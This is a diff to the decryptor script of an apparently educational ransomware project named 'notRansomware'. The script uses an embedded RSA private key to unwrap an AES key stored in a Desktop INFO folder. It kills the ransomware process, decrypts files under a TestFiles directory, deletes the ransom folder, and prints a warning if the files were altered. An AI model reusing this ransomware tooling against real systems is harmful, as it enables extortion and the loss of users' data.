@@ -1,9 +1,8 @@
-import Crypto, ast, os, sys, glob, socket, base64, hashlib
+import Crypto, ast, os, sys, glob, socket, base64, hashlib, psutil, shutil
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 from Crypto import Random
 from os.path import expanduser
-from GenAsymKeys import GenAsymKeys
 import random
 import time
 
@@ -36,20 +35,32 @@ def traverse_files(nwd, key, depth):
     while files:
         for path in files:
             if not os.path.isdir(path):
-                print((depth*'  ') + "F: " + os.path.basename(os.path.normpath(path)))
-                decrypt_file(key, path)
+                #print((depth*'  ') + "F: " + os.path.basename(os.path.normpath(path)))
+                if os.path.basename(os.path.normpath(path)) == 'notRansomware':
+                    os.remove(path)
+                else:
+                    decrypt_file(key, path)
             else:
-                print((depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
+                #print((depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
                 traverse_files(path, key, depth + 1)
         files = []
 
 def main():
-    f = open ("privateKey.txt", 'r')
-    rsa_key = RSA.importKey(f.read())
-    f.close()
+    #### PRIVATE DECRYPTION KEY WILL BE ADDED HERE ####
+
+
+    rsa_key = RSA.importKey(priv_key)
+
+    PROCNAME = "notRansomware"
+    for proc in psutil.process_iter():
+        if proc.name() == PROCNAME:
+            proc.kill()
 
     home = expanduser('~')
-    info_dir = home + '/Desktop/READ'
+    info_dir = home + '/Desktop/INFO'
+    if not os.path.exists(info_dir) or not os.path.exists(info_dir + "/encryptedKey.txt"):
+        print("Unfortunately, YOU altered files... The decryption process will no longer work.")
+        sys.exit()
     f = open (info_dir + "/encryptedKey.txt", 'r')
     enc_aes_key = f.read()
     f.close()
@@ -61,6 +72,8 @@ def main():
     cwd = home + '/TestFiles'
 
     traverse_files(cwd, dec_aes_key, 0)
+
+    shutil.rmtree(info_dir)
 
 if __name__ == "__main__":
     main()
